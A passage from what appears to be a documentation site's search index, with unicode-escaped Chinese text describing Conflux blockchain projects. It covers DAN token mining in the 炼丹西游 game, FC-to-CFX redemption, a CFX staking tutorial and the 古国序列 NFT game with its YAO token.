\u91d1\u4e39\uff0c\u597d\u7ba1\u597d\u73a9\u6536\u76ca\u66f4\u9ad8\u3002\u540c\u65f6\u901a\u8fc7\u8f6e\u56de\u673a\u5236\uff0c\u4fdd\u6301\u91d1\u4e39\u7684\u4ef7\u503c\u3002 \u672c\u9879\u76ee\u57fa\u4e8eConflux\u5e95\u5c42\u5f00\u53d1\uff0c\u8d28\u62bcC\u94fe\u6240\u6709\u4ee3\u5e01\u53ef\u4ee5\u70bc\u4e39\u3002\u57fa\u4e8eConflux\u516c\u94fe\u53d1\u884c\u897f\u6e38\u57fa\u7840\u4eba\u7269NFT\u548c\u6e38\u620f\u5173\u5361NFT\uff1b\u91d1\u4e39\u53ef\u5151\u6362\u897f\u6e38\u57fa\u7840NFT\u3001\u62bd\u53d6\u5173\u5361NFT\u3001\u4ea4\u6362\u4ea4\u6613\u3001\u4e5f\u53ef\u4f5c\u4e3a\u70bc\u4e39\u6750\u6599\u3002 \u751f\u6001\u94fe\u63a5 \u00b6 \u70bc\u4e39\u897f\u6e38\u4e3b\u9875 \u70bc\u4e39\u897f\u6e38\u8bba\u575b\u677f\u5757 \u751f\u6001\u529f\u80fd\u4ecb\u7ecd \u00b6 \u751f\u6001\u4e3b\u9875\u9875\u9762\u5982\u4e0b\u6240\u793a\uff0c\u4e3b\u8981\u5305\u62ec\uff1a \u4e3b\u9875\uff1a\u5e73\u53f0\u4ecb\u7ecd\u53ca\u897f\u6e38\u4efb\u52a1NFT\u5c55\u793a \u70bc\u4e39\uff1a\u5b58\u5165\u5404\u79cdConflux\u94fe\u4ee3\u5e01\u5e76\u6316\u4e39 \u6211\u7684NFT\uff1a\u663e\u793a\u5f53\u524d\u94b1\u5305\u5730\u5740\u5185\u4fdd\u5b58\u7684\u897f\u6e38NFT \u897f\u6e38\u95ef\u5173\uff1a\u9884\u8ba1 9 \u6708\u4e0a\u7ebf\uff0c\u656c\u8bf7\u671f\u5f85 Note \u4f7f\u7528\u6d4f\u89c8\u5668\u73a9\u800d\u70bc\u4e39\u897f\u6e38\u9700\u8981\u914d\u7f6eConflux Portal\u94b1\u5305\uff0c\u914d\u7f6e\u6559\u7a0b\u89c1 Portal \u5b89\u88c5\u914d\u7f6e\u6b65\u9aa4 \u4ee3\u5e01\u4ecb\u7ecd \u00b6 \u91d1\u4e39DAN\uff0cConflux\u5b87\u5b99\u603b\u91cf\uff1a47304000\u4e39\uff0c\u65e0\u9884\u6316\uff0c100%\u901a\u8fc7\u70bc\u4e39\u83b7\u5f97\uff0c\u6bcf\u65e5\u91ca\u653e\u91cf\u4e3a13500\u4e2a\u3002 \u91d1\u4e39DAN\u4ee3\u5e01\u5408\u7ea6\u5730\u5740\uff1acfx:acbyzcbfpymaz43rr6s1gtx0fb08guj88uzc05rchf \u53ef\u53c2\u8003 \u6dfb\u52a0 CRC20 \u4ee3\u5e01\u5230 Portal \u7684\u65b9\u6cd5\u4e0e\u6b65\u9aa4 \u6559\u7a0b\uff0c\u5c06DAN\u6dfb\u52a0\u81f3Conflux Portal\u4e2d\uff0c\u6dfb\u52a0\u5173\u952e\u6b65\u9aa4\u5982\u4e0b\uff08\u4e00\u4e9b\u6b65\u9aa4\u5df2\u8df3\u8fc7\uff09\uff1a \u7c98\u8d34\u91d1\u4e39\u5408\u7ea6\u5730\u5740\u5230Portal\u81ea\u5b9a\u4e49\u4ee3\u5e01\u4e2d\uff0c\u70b9\u51fb\u4e0b\u4e00\u6b65\u53ca\u6dfb\u52a0\u4ee3\u5e01\u6309\u94ae\u540e\u5373\u53ef \u5982\u4f55\u6316DAN \u00b6 \u8d28\u62bc\u5404\u79cdConflux\u94fe\u4e0a\u4ee3\u5e01\uff0c\u5373\u53ef\u6316dan \u8bbf\u95ee \u70bc\u4e39 \u9875\u9762 \u5982\u679c\u6240\u6709\u4ee3\u5e01\u90fd\u60f3\u5b58\u5165\uff0c\u76f4\u63a5\u70b9\u9875\u9762\u4e2d\u201c\u4e00\u952e\u6700\u5927\u201d\uff0c\u70bc\u4e39\u897f\u6e38\u4f1a\u81ea\u52a8\u4e3a\u4f60\u8bbe\u7f6e\u6700\u4f73\u5b58\u5e01\u6570\u76ee \u70b9\u51fb\u201c\u5347\u7089\u70bc\u4e39\u201d\u6309\u94ae\uff0c\u70b9\u51fbPortal\u6216\u94b1\u5305\u4e2d\u7684\u786e\u8ba4\u4ea4\u6613\u6309\u94ae\uff0c\u5373\u8d28\u62bc\u4ee3\u5e01\u6316DAN \u4ea4\u6613\u786e\u8ba4\u540e\uff0c\u9875\u9762\u4e2d\u5c06\u663e\u793a\u201c\u7075\u6c14\u91cf\u201d\u4fe1\u606f\u548c\u70bc\u4e39\u901f\u7387\uff1a\u5982\u70bc\u4e39\u901f\u7387\u4e3a 10\u5206\u949f \uff0c\u4ee3\u8868\u60a8\u8d28\u62bc\u7684\u5e01\u80fd\u8ba9\u60a8\u6bcf10\u5206\u949f\u6316\u5230\u4e00\u4e2aDAN\u5e01 \u63d0\u53d6DAN \u00b6 \u70b9\u51fb \u70bc\u4e39 \u4e2d\u201c\u53d6\u4e39\u201d\u6309\u94ae \u786e\u8ba4\u4ea4\u6613 \u53d6DAN\u6210\u529f\u540e\uff0c\u9875\u9762\u63d0\u793a\u201c\u5df2\u53d6\u5f97\u91d1\u4e39\u201d","title":"\u70bc\u4e39\u897f\u6e38"},{"location":"ecosystem/dan/#_1","text":"","title":"\u70bc\u4e39\u897f\u6e38"},{"location":"ecosystem/dan/#_2","text":"\u6211\u56fd\u56db\u5927\u540d\u8457\u4e2d\uff0c\u7ea2\u697c\u68a6\u3001\u6c34\u6d52\u4f20\u3001\u4e09\u56fd\u6f14\u827a\u3001\u897f\u6e38\u8bb0\u90fd\u6709\u7ecf\u5178\u8fde\u73af\u753b\uff0c\u6211\u4eec\u6709\u8ba1\u5212\u5c06\u5b83\u4eec\u4ee5NFT\u7684\u5f62\u5f0f\u505a\u6210\u9ad8\u6e05\u6570\u5b57\u6536\u85cf\u7248\u3002\u5bf9\u4e8e\u897f\u6e38\u8bb0\u5f88\u591a\u670b\u53cb\u4f1a\u6709\u4e2a\u7591\u95ee\uff1a\u4e5d\u4e5d\u516b\u5341\u4e00\u96be\u6ca1\u6709\u770b\u5168\u8fc7\uff0c\u603b\u611f\u89c9\u5c11\u4e86\u4e00\u4e9b\u3002\u6240\u4ee5\u6211\u4eec\u65b0\u7ed8\u5236\u4e00\u5957\u6309\u7167\u516b\u5341\u4e00\u96be\u7684\u897f\u6e38\u620f\u7ed8\u753b\u5e76\u53d1\u884cNFT\uff0c\u4ece\u65b0\u7684\u89d2\u5ea6\u91cd\u6e29\u53d6\u7ecf\u8bb0\u5fc6\uff0c\u4f7f\u7528\u533a\u5757\u94fe\u6280\u672f\u521b\u9020\u897f\u6e38\u5143\u5b87\u5b99\uff0c\u5f18\u626c\u4e2d\u534e\u6587\u5316\u3002\u73b0\u5728\u533a\u5757\u94fe\u7684\u5e38\u89c1DeFi\u73a9\u6cd5\uff0c\u6bcf\u79cdToken\u9700\u8981\u5355\u72ec\u5efa\u7acb\u6c60\u5b50\uff0c\u5355\u72ec\u64cd\u4f5c\u3002\u5927\u5bb6\u62e5\u6709\u7684\u533a\u5757\u94fe\u6570\u5b57\u8d44\u4ea7\u79cd\u7c7b\u8d8a\u6765\u8d8a\u591a\uff0c\u64cd\u4f5c\u8d8a\u6765\u8d8a\u7e41\u7410\u3002\u5f88\u591a\u4f53\u91cf\u4e0d\u591f\u5927\u7684\u8d44\u4ea7\u5f80\u5f80\u6ca1\u6709\u65e0\u635f\u6316\u77ff\u7684\u6e20\u9053\uff0c\u4e00\u4e9b\u5c0f\u989d\u8d44\u4ea7\u5927\u5bb6\u4e5f\u61d2\u5f97\u8fdb\u884c\u8d28\u62bc\u3002\u6211\u4eec\u9996\u521b\u70bc\u4e39\u65b0\u73a9\u6cd5\uff1a\u5f88\u591a\u79cd\u8d44\u4ea7\u53ef\u4ee5\u540c\u65f6\u8d28\u62bc\u5230\u4e00\u4e2a\u70bc\u4e39\u7089\u5185\u83b7\u5f97\u91d1\u4e39\uff0c\u597d\u7ba1\u597d\u73a9\u6536\u76ca\u66f4\u9ad8\u3002\u540c\u65f6\u901a\u8fc7\u8f6e\u56de\u673a\u5236\uff0c\u4fdd\u6301\u91d1\u4e39\u7684\u4ef7\u503c\u3002 \u672c\u9879\u76ee\u57fa\u4e8eConflux\u5e95\u5c42\u5f00\u53d1\uff0c\u8d28\u62bcC\u94fe\u6240\u6709\u4ee3\u5e01\u53ef\u4ee5\u70bc\u4e39\u3002\u57fa\u4e8eConflux\u516c\u94fe\u53d1\u884c\u897f\u6e38\u57fa\u7840\u4eba\u7269NFT\u548c\u6e38\u620f\u5173\u5361NFT\uff1b\u91d1\u4e39\u53ef\u5151\u6362\u897f\u6e38\u57fa\u7840NFT\u3001\u62bd\u53d6\u5173\u5361NFT\u3001\u4ea4\u6362\u4ea4\u6613\u3001\u4e5f\u53ef\u4f5c\u4e3a\u70bc\u4e39\u6750\u6599\u3002","title":"\u751f\u6001\u4ecb\u7ecd"},{"location":"ecosystem/dan/#_3","text":"\u70bc\u4e39\u897f\u6e38\u4e3b\u9875 \u70bc\u4e39\u897f\u6e38\u8bba\u575b\u677f\u5757","title":"\u751f\u6001\u94fe\u63a5"},{"location":"ecosystem/dan/#_4","text":"\u751f\u6001\u4e3b\u9875\u9875\u9762\u5982\u4e0b\u6240\u793a\uff0c\u4e3b\u8981\u5305\u62ec\uff1a \u4e3b\u9875\uff1a\u5e73\u53f0\u4ecb\u7ecd\u53ca\u897f\u6e38\u4efb\u52a1NFT\u5c55\u793a \u70bc\u4e39\uff1a\u5b58\u5165\u5404\u79cdConflux\u94fe\u4ee3\u5e01\u5e76\u6316\u4e39 \u6211\u7684NFT\uff1a\u663e\u793a\u5f53\u524d\u94b1\u5305\u5730\u5740\u5185\u4fdd\u5b58\u7684\u897f\u6e38NFT \u897f\u6e38\u95ef\u5173\uff1a\u9884\u8ba1 9 \u6708\u4e0a\u7ebf\uff0c\u656c\u8bf7\u671f\u5f85 Note \u4f7f\u7528\u6d4f\u89c8\u5668\u73a9\u800d\u70bc\u4e39\u897f\u6e38\u9700\u8981\u914d\u7f6eConflux Portal\u94b1\u5305\uff0c\u914d\u7f6e\u6559\u7a0b\u89c1 Portal \u5b89\u88c5\u914d\u7f6e\u6b65\u9aa4","title":"\u751f\u6001\u529f\u80fd\u4ecb\u7ecd"},{"location":"ecosystem/dan/#_5","text":"\u91d1\u4e39DAN\uff0cConflux\u5b87\u5b99\u603b\u91cf\uff1a47304000\u4e39\uff0c\u65e0\u9884\u6316\uff0c100%\u901a\u8fc7\u70bc\u4e39\u83b7\u5f97\uff0c\u6bcf\u65e5\u91ca\u653e\u91cf\u4e3a13500\u4e2a\u3002 \u91d1\u4e39DAN\u4ee3\u5e01\u5408\u7ea6\u5730\u5740\uff1acfx:acbyzcbfpymaz43rr6s1gtx0fb08guj88uzc05rchf \u53ef\u53c2\u8003 \u6dfb\u52a0 CRC20 \u4ee3\u5e01\u5230 Portal \u7684\u65b9\u6cd5\u4e0e\u6b65\u9aa4 \u6559\u7a0b\uff0c\u5c06DAN\u6dfb\u52a0\u81f3Conflux Portal\u4e2d\uff0c\u6dfb\u52a0\u5173\u952e\u6b65\u9aa4\u5982\u4e0b\uff08\u4e00\u4e9b\u6b65\u9aa4\u5df2\u8df3\u8fc7\uff09\uff1a \u7c98\u8d34\u91d1\u4e39\u5408\u7ea6\u5730\u5740\u5230Portal\u81ea\u5b9a\u4e49\u4ee3\u5e01\u4e2d\uff0c\u70b9\u51fb\u4e0b\u4e00\u6b65\u53ca\u6dfb\u52a0\u4ee3\u5e01\u6309\u94ae\u540e\u5373\u53ef","title":"\u4ee3\u5e01\u4ecb\u7ecd"},{"location":"ecosystem/dan/#dan","text":"\u8d28\u62bc\u5404\u79cdConflux\u94fe\u4e0a\u4ee3\u5e01\uff0c\u5373\u53ef\u6316dan \u8bbf\u95ee \u70bc\u4e39 \u9875\u9762 \u5982\u679c\u6240\u6709\u4ee3\u5e01\u90fd\u60f3\u5b58\u5165\uff0c\u76f4\u63a5\u70b9\u9875\u9762\u4e2d\u201c\u4e00\u952e\u6700\u5927\u201d\uff0c\u70bc\u4e39\u897f\u6e38\u4f1a\u81ea\u52a8\u4e3a\u4f60\u8bbe\u7f6e\u6700\u4f73\u5b58\u5e01\u6570\u76ee \u70b9\u51fb\u201c\u5347\u7089\u70bc\u4e39\u201d\u6309\u94ae\uff0c\u70b9\u51fbPortal\u6216\u94b1\u5305\u4e2d\u7684\u786e\u8ba4\u4ea4\u6613\u6309\u94ae\uff0c\u5373\u8d28\u62bc\u4ee3\u5e01\u6316DAN \u4ea4\u6613\u786e\u8ba4\u540e\uff0c\u9875\u9762\u4e2d\u5c06\u663e\u793a\u201c\u7075\u6c14\u91cf\u201d\u4fe1\u606f\u548c\u70bc\u4e39\u901f\u7387\uff1a\u5982\u70bc\u4e39\u901f\u7387\u4e3a 10\u5206\u949f \uff0c\u4ee3\u8868\u60a8\u8d28\u62bc\u7684\u5e01\u80fd\u8ba9\u60a8\u6bcf10\u5206\u949f\u6316\u5230\u4e00\u4e2aDAN\u5e01","title":"\u5982\u4f55\u6316DAN"},{"location":"ecosystem/dan/#dan_1","text":"\u70b9\u51fb \u70bc\u4e39 \u4e2d\u201c\u53d6\u4e39\u201d\u6309\u94ae \u786e\u8ba4\u4ea4\u6613 \u53d6DAN\u6210\u529f\u540e\uff0c\u9875\u9762\u63d0\u793a\u201c\u5df2\u53d6\u5f97\u91d1\u4e39\u201d","title":"\u63d0\u53d6DAN"},{"location":"ecosystem/fc-exchange/","text":"FC\u5151\u6362CFX\u751f\u6001 \u00b6 \u751f\u6001\u4ecb\u7ecd \u00b6 \u901a\u8fc7\u9500\u6bc1FC\uff0c\u63091:1\u5151\u6362CFX\uff0c\u7b7e\u7ea6\u5229\u606f\u5408\u7ea6\uff0c\u80fd\u591f\u4eab\u53d7CFX\u6316\u77ff\u5229\u606f\u3002 \u64cd\u4f5c\u6b65\u9aa4 \u00b6 \u672c\u64cd\u4f5c\u4ec5\u9488\u5bf9\u4e4b\u524d\u5df2\u9500\u6bc1FC\uff0c\u83b7\u5f971:1\u5151\u6362CFX\u6743\u76ca\u7684\u7528\u6237","title":"FC\u5151\u6362CFX\u751f\u6001"},{"location":"ecosystem/fc-exchange/#fccfx","text":"","title":"FC\u5151\u6362CFX\u751f\u6001"},{"location":"ecosystem/fc-exchange/#_1","text":"\u901a\u8fc7\u9500\u6bc1FC\uff0c\u63091:1\u5151\u6362CFX\uff0c\u7b7e\u7ea6\u5229\u606f\u5408\u7ea6\uff0c\u80fd\u591f\u4eab\u53d7CFX\u6316\u77ff\u5229\u606f\u3002","title":"\u751f\u6001\u4ecb\u7ecd"},{"location":"ecosystem/fc-exchange/#_2","text":"\u672c\u64cd\u4f5c\u4ec5\u9488\u5bf9\u4e4b\u524d\u5df2\u9500\u6bc1FC\uff0c\u83b7\u5f971:1\u5151\u6362CFX\u6743\u76ca\u7684\u7528\u6237","title":"\u64cd\u4f5c\u6b65\u9aa4"},{"location":"ecosystem/governance/","text":"Staking\u5408\u7ea6\u7684\u8d28\u62bc\u4e0e\u89e3\u8d28\u62bc \u00b6 Staking\u5408\u7ea6\u4ecb\u7ecd \u00b6 Conflux\u5171\u63d0\u4f9b\u4e86\u4e09\u79cd\u5185\u7f6e\u5408\u7ea6\uff0c\u4f60\u53ef\u4ee5\u8bbf\u95ee Conflux Scan\u5185\u7f6e\u5408\u7ea6 \u4e86\u89e3Conflux\u5df2\u63d0\u4f9b\u7684\u5185\u7f6e\u5408\u7ea6\u4fe1\u606f\u3002\u5728\u6b64\u6587\u4e2d\u5c06\u91cd\u70b9\u4ecb\u7ecdStaking\u5408\u7ea6\uff0c\u4f60\u53ef\u4ee5\u8bbf\u95ee Conflux Scan Staking\u5408\u7ea6\u677f\u5757 \u67e5\u770b\u4e0eStaking\u5408\u7ea6\u76f8\u5173\u7684CFX\u4ea4\u6613\u3002 \u5f53\u4f60\u5c06CFX\u8d28\u62bc\u5230Staking\u5408\u7ea6\u540e\uff0c\u5c06\u4f1a\u4eab\u53d7\u590d\u52294.08%\u7684\u5e74\u5316\uff0c\u9700\u8981\u660e\u786e\u7684\u662f\u6240\u83b7\u5f97\u7684 \u5229\u606f\u5c06\u4f1a\u4ee5\u589e\u53d1\u5f62\u5f0f\u7684CFX\u652f\u4ed8 \u3002 \u5355\u6b21\u8d28\u62bc\u64cd\u4f5c\u9700\u8981\u94b1\u5305\u91cc\u81f3\u5c11\u67092CFX\uff0cStaking\u6700\u5c0f\u80fd\u63a5\u53d7\u8d28\u62bc\u6570\u989d\u4e3a1CFX\uff0c\u4e24\u8005\u4e4b\u95f4\u7684\u5173\u7cfb\u4e3a2-1=1 Staking CFX\u8d28\u62bc\u751f\u6001\u94fe\u63a5 \u00b6 \u8d28\u62bcCFX \uff1a\u9700\u8981\u660e\u786e\u7684\u662f\uff0c\u8be5\u7cfb\u7edf\u4ec5\u652f\u6301\u7535\u8111\u7aef\u64cd\u4f5c \u8d28\u62bcCFX\u6559\u7a0b \u00b6 \u4f7f\u7528\u914d\u7f6e\u4e86Conflux Portal\uff08 \u914d\u7f6e\u6559\u7a0b \uff09\u7684\u6d4f\u89c8\u5668\u8bbf\u95ee \u8d28\u62bcCFX \u9875\u9762\uff0c\u5e76\u70b9\u51fb\u53f3\u4e0a\u89d2\u201c\u8fde\u63a5\u94b1\u5305\u201d\u6309\u94ae\u8fde\u63a5\u94b1\u5305\u540e\u7684\u9875\u9762\u5982\u4e0b\u56fe\u6240\u793a\uff1a Note \u94b1\u5305\u5185\u6709150.352\u4e2aCFX\uff0c\u4e3a\u786e\u4fdd\u5b89\u5168\uff08\u786e\u4fdd\u94b1\u5305\u5185\u6709\u8db3\u591f\u7684CFX\u6267\u884c\u5408\u7ea6\u4ea4\u4e92\u4ea4\u6613\uff09\u53ef\u8d28\u62bc\u6570\u91cf\u4e3a150.352-1=149.352\u4e2aCFX \u70b9\u51fb\u201c\u53ef\u7528\u8d28\u62bc\u6570\u91cf\u201d\u65c1\u8fb9\u7684\u201c\u6700\u5927\u201d\u6309\u94ae\uff0c\u4f1a\u663e\u793a\u6309\u6700\u5927\u6570\u76ee\u8d28\u62bcCFX\u7684\u6570\u91cf \u70b9\u51fb\u8d28\u62bc\u6309\u94ae\uff0c\u4f1a\u81ea\u52a8\u547c\u51faConflux Portal\uff0c\u70b9\u51fb\u786e\u8ba4\u6309\u94ae\u4ee5\u4fbf\u4e0eStaking\u5408\u7ea6\u4ea4\u4e92 \u7cfb\u7edf\u663e\u793aStaking\u4ea4\u6613\u5df2\u53d1\u51fa\uff0c\u8010\u5fc3\u7b49\u5f85 \u4ea4\u6613\u6267\u884c\u540e\uff0c\u53d1\u73b0\u53ef\u7528\u63d0\u53d6CFX\u6570\u91cf\u53d8\u4e3a149.352CFX \u63d0\u53d6CFX\u6559\u7a0b \u00b6 \u70b9\u51fb\u201c\u53ef\u7528\u63d0\u53d6\u6570\u91cf\u201d\u65c1\u8fb9\u7684\u201c\u6700\u5927\u201d\u6309\u94ae\uff0c\u4f1a\u663e\u793a\u53ef\u63d0\u53d6\u7684CFX\u6570\u91cf \u70b9\u51fb\u63d0\u53d6\u6309\u94ae\uff0c\u4f1a\u81ea\u52a8\u547c\u51faConflux Portal\uff0c\u70b9\u51fb\u786e\u8ba4\u6309\u94ae\u4ee5\u4fbf\u4e0eStaking\u5408\u7ea6\u4ea4\u4e92\u5e76\u63d0\u53d6\u4ee3\u5e01 \u5237\u65b0\u9875\u9762\uff0c\u53d1\u73b0\u94b1\u5305\u5df2\u63d0\u53d6\u5230CFX \u5229\u7528Conflux\u5206\u6790Staking\u4ea4\u6613 \u00b6 \u9488\u5bf9\u6b64\u6b21Staking\u5408\u7ea6\u4ea4\u4e92\u7684\u4ea4\u6613\u53ef\u67e5\u770b \u5229\u7528 ConfluxScan \u5206\u6790 Staking \u5408\u7ea6\u5185\u90e8\u4ea4\u4e92\u60c5\u51b5","title":"Staking\u5408\u7ea6\u7684\u8d28\u62bc\u4e0e\u89e3\u8d28\u62bc"},{"location":"ecosystem/governance/#staking","text":"","title":"Staking\u5408\u7ea6\u7684\u8d28\u62bc\u4e0e\u89e3\u8d28\u62bc"},{"location":"ecosystem/governance/#staking_1","text":"Conflux\u5171\u63d0\u4f9b\u4e86\u4e09\u79cd\u5185\u7f6e\u5408\u7ea6\uff0c\u4f60\u53ef\u4ee5\u8bbf\u95ee Conflux Scan\u5185\u7f6e\u5408\u7ea6 \u4e86\u89e3Conflux\u5df2\u63d0\u4f9b\u7684\u5185\u7f6e\u5408\u7ea6\u4fe1\u606f\u3002\u5728\u6b64\u6587\u4e2d\u5c06\u91cd\u70b9\u4ecb\u7ecdStaking\u5408\u7ea6\uff0c\u4f60\u53ef\u4ee5\u8bbf\u95ee Conflux Scan Staking\u5408\u7ea6\u677f\u5757 \u67e5\u770b\u4e0eStaking\u5408\u7ea6\u76f8\u5173\u7684CFX\u4ea4\u6613\u3002 \u5f53\u4f60\u5c06CFX\u8d28\u62bc\u5230Staking\u5408\u7ea6\u540e\uff0c\u5c06\u4f1a\u4eab\u53d7\u590d\u52294.08%\u7684\u5e74\u5316\uff0c\u9700\u8981\u660e\u786e\u7684\u662f\u6240\u83b7\u5f97\u7684 \u5229\u606f\u5c06\u4f1a\u4ee5\u589e\u53d1\u5f62\u5f0f\u7684CFX\u652f\u4ed8 \u3002 \u5355\u6b21\u8d28\u62bc\u64cd\u4f5c\u9700\u8981\u94b1\u5305\u91cc\u81f3\u5c11\u67092CFX\uff0cStaking\u6700\u5c0f\u80fd\u63a5\u53d7\u8d28\u62bc\u6570\u989d\u4e3a1CFX\uff0c\u4e24\u8005\u4e4b\u95f4\u7684\u5173\u7cfb\u4e3a2-1=1","title":"Staking\u5408\u7ea6\u4ecb\u7ecd"},{"location":"ecosystem/governance/#staking-cfx","text":"\u8d28\u62bcCFX \uff1a\u9700\u8981\u660e\u786e\u7684\u662f\uff0c\u8be5\u7cfb\u7edf\u4ec5\u652f\u6301\u7535\u8111\u7aef\u64cd\u4f5c","title":"Staking CFX\u8d28\u62bc\u751f\u6001\u94fe\u63a5"},{"location":"ecosystem/governance/#cfx","text":"\u4f7f\u7528\u914d\u7f6e\u4e86Conflux Portal\uff08 \u914d\u7f6e\u6559\u7a0b \uff09\u7684\u6d4f\u89c8\u5668\u8bbf\u95ee \u8d28\u62bcCFX \u9875\u9762\uff0c\u5e76\u70b9\u51fb\u53f3\u4e0a\u89d2\u201c\u8fde\u63a5\u94b1\u5305\u201d\u6309\u94ae\u8fde\u63a5\u94b1\u5305\u540e\u7684\u9875\u9762\u5982\u4e0b\u56fe\u6240\u793a\uff1a Note \u94b1\u5305\u5185\u6709150.352\u4e2aCFX\uff0c\u4e3a\u786e\u4fdd\u5b89\u5168\uff08\u786e\u4fdd\u94b1\u5305\u5185\u6709\u8db3\u591f\u7684CFX\u6267\u884c\u5408\u7ea6\u4ea4\u4e92\u4ea4\u6613\uff09\u53ef\u8d28\u62bc\u6570\u91cf\u4e3a150.352-1=149.352\u4e2aCFX \u70b9\u51fb\u201c\u53ef\u7528\u8d28\u62bc\u6570\u91cf\u201d\u65c1\u8fb9\u7684\u201c\u6700\u5927\u201d\u6309\u94ae\uff0c\u4f1a\u663e\u793a\u6309\u6700\u5927\u6570\u76ee\u8d28\u62bcCFX\u7684\u6570\u91cf \u70b9\u51fb\u8d28\u62bc\u6309\u94ae\uff0c\u4f1a\u81ea\u52a8\u547c\u51faConflux Portal\uff0c\u70b9\u51fb\u786e\u8ba4\u6309\u94ae\u4ee5\u4fbf\u4e0eStaking\u5408\u7ea6\u4ea4\u4e92 \u7cfb\u7edf\u663e\u793aStaking\u4ea4\u6613\u5df2\u53d1\u51fa\uff0c\u8010\u5fc3\u7b49\u5f85 \u4ea4\u6613\u6267\u884c\u540e\uff0c\u53d1\u73b0\u53ef\u7528\u63d0\u53d6CFX\u6570\u91cf\u53d8\u4e3a149.352CFX","title":"\u8d28\u62bcCFX\u6559\u7a0b"},{"location":"ecosystem/governance/#cfx_1","text":"\u70b9\u51fb\u201c\u53ef\u7528\u63d0\u53d6\u6570\u91cf\u201d\u65c1\u8fb9\u7684\u201c\u6700\u5927\u201d\u6309\u94ae\uff0c\u4f1a\u663e\u793a\u53ef\u63d0\u53d6\u7684CFX\u6570\u91cf \u70b9\u51fb\u63d0\u53d6\u6309\u94ae\uff0c\u4f1a\u81ea\u52a8\u547c\u51faConflux Portal\uff0c\u70b9\u51fb\u786e\u8ba4\u6309\u94ae\u4ee5\u4fbf\u4e0eStaking\u5408\u7ea6\u4ea4\u4e92\u5e76\u63d0\u53d6\u4ee3\u5e01 \u5237\u65b0\u9875\u9762\uff0c\u53d1\u73b0\u94b1\u5305\u5df2\u63d0\u53d6\u5230CFX","title":"\u63d0\u53d6CFX\u6559\u7a0b"},{"location":"ecosystem/governance/#confluxstaking","text":"\u9488\u5bf9\u6b64\u6b21Staking\u5408\u7ea6\u4ea4\u4e92\u7684\u4ea4\u6613\u53ef\u67e5\u770b \u5229\u7528 ConfluxScan \u5206\u6790 Staking \u5408\u7ea6\u5185\u90e8\u4ea4\u4e92\u60c5\u51b5","title":"\u5229\u7528Conflux\u5206\u6790Staking\u4ea4\u6613"},{"location":"ecosystem/guguo/","text":"\u53e4\u56fd\u5e8f\u5217 \u00b6 \u751f\u6001\u4ecb\u7ecd \u00b6 \u53e4\u56fd\u5e8f\u5217 Ancient Chinese Gods\u662f\u4ee5\u300c\u4e2d\u56fd\u5168\u7cfb\u5217\u795e\u8bdd\u4f20\u8bf4\u300d\u4e3a\u7075\u611f\u6253\u9020\u7684\u52a0\u5bc6\u85cf\u54c1\u548c\u533a\u5757\u94fe\u7ade\u6280\u6e38\u620f\u3002\u53e4\u56fd\u5e8f\u5217NFT\u6536\u85cf\u5361\u7531\u5927\u91cf\u827a\u672f\u5bb6\u539f\u521b\uff0c\u6d89\u53ca10\u4e2a\u521b\u4f5c\u6bcd\u9898\u548c130\u4e2a\u521b\u4f5c\u84dd\u672c\u3002\u53e4\u56fd\u5e8f\u5217 NFT \u6536\u85cf\u5361\u96c6\u5408\u4e86 DeFi \u6d41\u52a8\u6027\u6316\u77ff\u548c\u7a00\u7f3a\u6027\u8bbe\u8ba1\uff0c\u662f\u53e4\u56fd\u5e8f\u5217\u7ade\u6280\u6e38\u620f\u7684\u91cd\u8981\u57fa\u7840\u3002374 \u5929\u7684 NFT \u53d1\u884c\u671f\u5c06\u6700\u5c11\u53d1\u884c 130 \u4e2a\u7ecf\u5178\u795e\u8bdd IP\u3002\u53e4\u56fd\u5e8f\u5217\u5df2\u7ecf\u90e8\u7f72\u5728Conflux\u516c\u94fe\u548c\u4ee5\u592a\u574a\u4e0a\u3002 Token\u4ecb\u7ecd \u00b6 \u53e4\u56fd\u8d27\u5e01YAO \u662f\u4e00\u79cd ERC20 token\uff0c\u603b\u91cf\u662f100W\uff0c\u7528\u6237\u53ef\u4ee5\u4f7f\u7528\u8d28\u62bcYAO\u6765\u83b7\u53d6XIANG\uff0c\u4e5f\u53ef\u4ee5\u901a\u8fc7Swap\u8fdb\u884c\u4ea4\u6613\u3002XIANG\u53ef\u4ee5\u62bd\u53d6\u201c\u53e4\u56fd\u5e8f\u5217\u201d\u4e2d\u7684\u5404\u7c7bNFT \u5361\u724c\uff0c\u6240\u6709\u53e4\u56fd\u5e8f\u5217 NFT \u5747\u53ef\u5728 Tspace \u81ea\u7531\u4ea4\u6613\u3002 \u723bYAO\u7684\u603b\u91cf\u662f100\u4e07\u679a\uff0c\u5206\u53d1\u91c7\u7528\u7684\u662f\u7ebf\u6027\u5206\u53d1\uff0c\u521d\u59cb\u768414\u5929\u9ec4\u91d1\u5934\u77ff\uff0c\u53ef\u4ee5\u6316\u53d6\u603b\u91cf\u768430%\u3002\u5728conflux \u94fe\u4e0a\u94f8\u5e01100w,\u5176\u4e2d\u4ee5\u592a\u574a\u53d1\u884c10w\u901a\u8fc7shuttleflow \u8de8\u94fe\u5230\u4ee5\u592a\u574a.conflux \u94fe\u4e0a\u53d1\u884c90w.\u53e4\u56fd\u5e8f\u5217\u5c06\u901a\u8fc7\u6d41\u52a8\u6027\u6316\u77ff\u7684\u65b9\u5f0f\u5411\u77ff\u5de5\u5206\u53d1 YAO\uff0c\u77ff\u5de5\u53ef\u8d28\u62bc\u77e5\u540d NFT \u8d44\u4ea7\u5982 meme NFT\u3001Moonswap \u521b\u4e16 NFT\u3001FLUX NFT\u3001\u70e4\u4ed4NFT\u3001\u53e4\u56fd\u5e8f\u5217NFT\u3001Trea NFT\u3001Yuki NFT\u7684\u5f62\u5f0f\u6316\u77ff\u83b7\u5f97 YAO\u3002 \u751f\u6001\u94fe\u63a5 \u00b6 \u53e4\u56fd\u5e8f\u5217\u4e3b\u9875 NFT\u8d28\u62bc\u6316\u77ff\u9875\u9762 \u8d28\u62bcNFT\u6316yao \u00b6 \u9996\u5148\u60a8\u9700\u8981\u914d\u7f6e\u4e00\u4e2aConflux Portal\u94b1\u5305\uff0c \u914d\u7f6e\u6559\u7a0b \uff0c\u4e14\u94b1\u5305\u4e2d\u9700\u8981\u6301\u6709\u53e4\u56fd\u652f\u6301\u7684NFT\u8d44\u4ea7\u3002 